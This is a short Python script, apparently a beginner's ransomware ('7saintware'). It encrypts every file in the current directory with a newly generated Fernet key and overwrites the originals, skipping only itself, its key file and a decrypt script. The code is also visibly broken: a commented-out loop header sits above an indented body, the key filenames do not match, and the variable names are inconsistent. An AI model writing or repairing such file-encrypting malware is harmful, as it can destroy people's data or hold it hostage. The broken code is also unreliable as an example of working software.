
# Data Encryper/Encoder

import os
from cryptography.fernet import Fernet

files = []

#for file in os.listdir():
    if file == "7saintware.py" or file == "7saint.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("7saintkey.key", "rb") as key:
    secretkey = key.read()

key = Fernet.generate_key()

with open("7saint.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents.encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

        
print("Encrypted.")
